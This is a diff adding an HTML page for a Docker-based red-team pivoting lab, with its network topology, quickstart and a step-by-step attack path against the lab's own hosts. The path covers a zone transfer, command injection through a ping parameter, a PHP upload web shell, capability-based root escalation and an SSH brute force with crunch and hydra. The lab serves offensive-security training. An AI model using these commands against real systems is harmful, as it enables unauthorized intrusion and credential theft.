@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>IPvLab &mdash; route-jumping intranet lab</title>
+<style>
+  :root{
+    --bg:#0c1017; --panel:#141a24; --panel2:#1b2330; --line:#2a3444;
+    --fg:#e6edf3; --mut:#8b98a9; --grn:#3fb950; --cyn:#39c5cf; --ylw:#d29922;
+    --red:#f85149; --code:#0d1117;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--fg);
+    font:15px/1.6 "Segoe UI",system-ui,-apple-system,Roboto,sans-serif}
+  .wrap{max-width:960px;margin:0 auto;padding:2rem 1.2rem 5rem}
+  header{border-bottom:1px solid var(--line);padding-bottom:1.2rem;margin-bottom:2rem}
+  h1{font-size:1.7rem;margin:0 0 .3rem}
+  h1 .tag{color:var(--grn)}
+  .sub{color:var(--mut);font-size:.95rem}
+  h2{font-size:1.2rem;color:var(--cyn);margin:2.4rem 0 .8rem}
+  h3{font-size:1.05rem;margin:1.6rem 0 .6rem;color:var(--ylw)}
+  p{color:var(--fg)}
+  code{background:var(--code);border:1px solid var(--line);border-radius:4px;
+    padding:1px 6px;font-size:.9em}
+  pre{background:var(--code);border:1px solid var(--line);border-radius:8px;
+    padding:.9rem 1rem;overflow:auto;font-size:.85rem;line-height:1.5}
+  pre code{background:none;border:none;padding:0}
+  .mono,pre,code{font-family:"Cascadia Code",Consolas,"JetBrains Mono",monospace}
+  table{border-collapse:collapse;width:100%;margin:1rem 0;font-size:.9rem}
+  th,td{border:1px solid var(--line);padding:.45rem .7rem;text-align:left}
+  th{background:var(--panel2);color:var(--fg)}
+  td{background:var(--panel)}
+  tr td:first-child{white-space:nowrap}
+  .note{border-left:3px solid var(--ylw);background:var(--panel2);
+    padding:.7rem 1rem;border-radius:0 6px 6px 0;margin:1rem 0}
+  .note b{color:var(--ylw)}
+  .topo{background:var(--panel);border:1px solid var(--line);border-radius:8px;
+    padding:1rem;font-size:.8rem;overflow:auto}
+  a{color:var(--cyn)}
+  ul{margin:.5rem 0;padding-left:1.4rem}
+  li{margin:.25rem 0}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header>
+  <h1><span class="tag">IPvLab</span> &mdash; route-jumping intranet lab</h1>
+  <div class="sub">Attacker-perspective lab: pivot hop by hop, brute the last host&rsquo;s SSH.</div>
+</header>
+
+<section>
+<h2>Topology</h2>
+<div class="topo"><pre>
+             attacker                      10.10.10.2          10.20.20.3           10.30.30.3
+     +----------------+                +-----------+          +-----------+         +-----------+
+     |  10.10.10.3    |  only m1       |     m1    |  m1-&gt;?   |     m2    |  m2-&gt;?   |     m3    |
+     |  (no ssh)      |  direct        | router+    |  only    | router+   |  only    | DVWA +    |
+     |  routes added  +----------------+ webapp     |  m2      | webapp    |  m3      | sshd :22  |
+     |  manually      |   10.10.10.2   | 80,8080    +----------+ upload-RCE+----------+           |
+     +----------------+                +-----------+ 10.20.20.3+-----------+ 10.30.30.2+-----------+
+</pre></div>
+<ul>
+  <li><b>m1</b> (<code>10.10.10.2</code>) &mdash; PingSweeper web tool (OS command injection),
+      authoritative DNS for <code>ipvlab.lab</code> (open AXFR), fronted by an IPS.</li>
+  <li><b>m2</b> (<code>10.20.20.3</code>) &mdash; JumpWeb file drop: takes any file, executes
+      <code>.php</code>; plus a <code>cap_setuid</code> python3.12 for root escalation.</li>
+  <li><b>m3</b> (<code>10.30.30.3</code>) &mdash; DVWA (<code>:80</code>) + the <b>only</b> sshd (<code>:22</code>) in the lab; brute-force target.</li>
+</ul>
+</section>
+
+<section>
+<h2>Quickstart &mdash; clone and run</h2>
+<p>No external dependencies beyond Docker (Compose v2).</p>
+<pre><code>git clone https://github.com/28d33/Marvel-CLCY_L2-CY_RED-Lab.git
+cd Marvel-CLCY_L2-CY_RED-Lab
+docker compose up --build -d
+docker compose ps        # m1, m2, m3 all healthy</code></pre>
+<p>The stand-in attacker box (<code>att</code>) is a tiny helper; run it with
+<code>docker compose exec</code> or by building the images and joining the
+<code>attacker_public</code> network.</p>
+</section>
+
+<section>
+<h2>m1&rsquo;s IPS &mdash; open to humans, dead to scanners</h2>
+<p>App ports <code>80/443/8080/8443</code> are open by default. Honest clients are served
+normally. The IPS watches how packets are formed:</p>
+<table>
+  <tr><th>Behavior</th><th>Trigger</th><th>Result</th></tr>
+  <tr><td>honest web traffic</td><td>NEW TCP to <code>80/443/8080/8443</code></td><td>accepted</td></tr>
+  <tr><td>NULL/XMAS/FIN/bare-ACK probes</td><td>2 in 10 s</td><td>source blacklisted 120 s</td></tr>
+  <tr><td>NEW SYN to a closed port</td><td>5 in 60 s</td><td>source blacklisted 120 s</td></tr>
+</table>
+<p>Once blacklisted, <b>every</b> packet from that source (INPUT &amp; FORWARD) is dropped for
+<b>120 seconds</b>, then it recovers automatically. Loud scanners read the host as all
+<code>filtered</code>/dead; a quiet human gets served.</p>
+</section>
+
+<section>
+<h2>Attack path</h2>
+
+<h3>0. Routing on the attacker box</h3>
+<pre><code># one hop:  reach m2 via m1
+ip route add 10.20.20.0/24 via 10.10.10.2
+# two hops: reach m3 via m1 then m2
+ip route add 10.30.30.0/24 via 10.10.10.2</code></pre>
+
+<h3>1. Recon &mdash; DNS and PingSweeper</h3>
+<pre><code>dig +noall +answer AXFR ipvlab.lab @10.10.10.2   # open zone transfer
+nmap -Pn -sS -p 80,8080,443,8443 10.10.10.2
+curl -s http://10.10.10.2/robots.txt             # hidden-path breadcrumbs
+curl -s http://10.10.10.2/config.bak             # [ping]/[admin] config</code></pre>
+
+<h3>2. m1 &mdash; command injection in the ping tool</h3>
+<pre><code>curl -s "http://10.10.10.2/ping?ip=127.0.0.1;id"
+# -> uid=101(webapp) ...</code></pre>
+
+<h3>3-4. m2 &mdash; PHP upload RCE</h3>
+<pre><code># Drop a PHP shell into /uploads (wwwrun), then:
+curl "http://10.20.20.3/uploads/shell.php?c=id"
+# -> uid=100(wwwrun)</code></pre>
+
+<h3>5. m2 &mdash; CAP_SETUID python3.12 &rarr; root</h3>
+<pre><code># jump through the capability-laden python -> uid 0, read the hint:
+# -> m3 = 10.30.30.3, ssh user: marvel, pass: 5 chars from charset {abcde12345!@#$%}</code></pre>
+
+<h3>6. m3 &mdash; the only SSH; brute it</h3>
+<pre><code>crunch 5 5 abcde12345!@#$% -o /tmp/pass.txt
+hydra -l marvel -P /tmp/pass.txt ssh://10.30.30.3 -t 32 -f
+# -> [22][ssh] login: marvel  password: aaa12</code></pre>
+
+<h3>7. DVWA through a local tunnel</h3>
+<pre><code>ssh -o StrictHostKeyChecking=no -L 127.0.0.1:38080:127.0.0.1:80 marvel@10.30.30.3
+curl http://127.0.0.1:38080/login.php    # DVWA login page, 200</code></pre>
+</section>
+
+<section>
+<h2>Deliberate choices</h2>
+<ul>
+  <li>No sshd on m1/m2 &mdash; everything is hop-by-hop pivoting; SSH exists only on m3 and is the brute target.</li>
+  <li>m1 hosts the lab DNS (authoritative-only for <code>ipvlab.lab</code>, open AXFR); it is not an open resolver.</li>
+  <li>The IPS keeps app ports open, auto-blacklists loud scanners for 120 s, and logs per-chain counters.</li>
+</ul>
+</section>
+
+<footer style="margin-top:3rem;border-top:1px solid var(--line);padding-top:1rem;color:var(--mut);font-size:.85rem">
+  Lab source: <a href="https://github.com/28d33/Marvel-CLCY_L2-CY_RED-Lab">github.com/28d33/Marvel-CLCY_L2-CY_RED-Lab</a>
+</footer>
+
+</div>
+</body>
+</html>
